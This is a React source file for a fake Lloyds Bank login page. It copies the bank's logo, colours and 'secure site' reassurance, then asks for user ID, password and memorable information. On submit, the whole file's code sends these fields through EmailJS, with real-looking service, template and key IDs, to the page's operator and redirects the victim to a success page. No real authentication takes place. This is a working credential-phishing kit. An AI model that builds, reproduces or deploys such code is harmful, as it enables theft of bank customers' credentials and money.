// src/pages/Login.jsx
import React, { useRef, useState } from "react";
import { FaLock } from "react-icons/fa";
import { MdErrorOutline } from "react-icons/md";
import emailjs from "@emailjs/browser";
import { useNavigate } from "react-router-dom";

export default function LloydsBank() {
  const form = useRef(); // ✅ EmailJS form ref
  const navigate = useNavigate();

  const [errors, setErrors] = useState({
    userId: false,
    password: false,
    memorable: false,
  });

  // ✅ Send login email using EmailJS
  const sendLoginEmail = (e) => {
    e.preventDefault();

    const formData = new FormData(form.current);
    const userId = formData.get("userId");
    const password = formData.get("password");
    const memorable = formData.get("memorable");

    const newErrors = {
      userId: !userId,
      password: !password,
      memorable: !memorable,
    };
    setErrors(newErrors);

    if (!newErrors.userId && !newErrors.password && !newErrors.memorable) {
      emailjs
        .sendForm(
          "service_e1eul13", // ✅ your EmailJS service ID
          "template_x4r3vzo", // ✅ your template ID
          form.current,
          "nb4k7l5gjhCm1Jyk1" // ✅ your public key
        )
        .then(
          (result) => {
            console.log("Email sent:", result.text);
            navigate("/success"); // ✅ redirect after success
          },
          (error) => {
            console.log("Error:", error.text);
          }
        );

      e.target.reset(); // ✅ clear form
    }
  };

  return (
    <div className="min-h-screen bg-white">
      {/* Header */}
      <header className="bg-[#006A4E] text-white flex items-center justify-between px-6 py-3">
        <div className="flex items-center space-x-2 ml-80">
          <img
            src="/img/lloydsbank logo.png"
            alt="Logo"
            className="h-13 w-60"
          />
        </div>

        <div className="flex items-center space-x-6 mr-86">
          <a href="#" className="underline text-lg">
            Mobile
          </a>
          <a href="#" className="underline text-lg">
            Cookie policy
          </a>
          <div className="border border-white px-5 py-3 text-sm">
            <p className="font-semibold flex items-center space-x-2">
              <FaLock className="text-white" />
              <span>You’re logging into a secure site</span>
            </p>
            <a href="#" className="underline text-xs">
              How can I tell that this site is secure?
            </a>
          </div>
        </div>
      </header>

      {/* Login Form */}
      <main className="flex flex-col items-start mt-20 ml-60">
        <form
          ref={form}
          onSubmit={sendLoginEmail}
          className="w-full max-w-lg rounded-md p-6"
        >
          {/* User ID */}
          <div className="mb-4">
            <label className="block text-sm font-medium mb-1">User ID:</label>
            <div
              className={`p-3 rounded border-2 ${
                errors.userId
                  ? "border-red-500 bg-red-50"
                  : "border-gray-800 bg-white"
              }`}
            >
              <input
                type="text"
                name="userId" // ✅ added for EmailJS
                className="w-full bg-transparent outline-none text-base"
                placeholder="Enter User ID"
              />
            </div>
            {errors.userId && (
              <p className="flex items-center text-red-600 mt-2 text-sm">
                <MdErrorOutline className="mr-1 text-lg" />
                Please enter a value.
              </p>
            )}
          </div>

          {/* Password */}
          <div className="mb-4">
            <label className="block text-sm font-medium mb-1">Password:</label>
            <div
              className={`p-3 rounded border-2 ${
                errors.password
                  ? "border-red-500 bg-red-50"
                  : "border-gray-800 bg-white"
              }`}
            >
              <input
                type="password"
                name="password" // ✅ added for EmailJS
                className="w-full bg-transparent outline-none text-base"
                placeholder="Enter Password"
              />
            </div>
            {errors.password && (
              <p className="flex items-center text-red-600 mt-2 text-sm">
                <MdErrorOutline className="mr-1 text-lg" />
                Please enter a value.
              </p>
            )}
          </div>

          {/* Memorable */}
          <div className="mb-6">
            <label className="block text-sm font-medium mb-1">Memorable:</label>
            <div
              className={`p-3 rounded border-2 ${
                errors.memorable
                  ? "border-red-500 bg-red-50"
                  : "border-gray-800 bg-white"
              }`}
            >
              <input
                type="text"
                name="memorable" // ✅ added for EmailJS
                className="w-full bg-transparent outline-none text-base"
                placeholder="Enter memorable"
              />
            </div>
            {errors.memorable && (
              <p className="flex items-center text-red-600 mt-2 text-sm">
                <MdErrorOutline className="mr-1 text-lg" />
                Please enter a value.
              </p>
            )}
          </div>

          {/* Continue Button */}
          <button
            type="submit"
            className="ml-87 px-6 py-3 bg-[#006A4E] text-white font-semibold transition"
          >
            Continue
          </button>
        </form>
      </main>
    </div>
  );
}
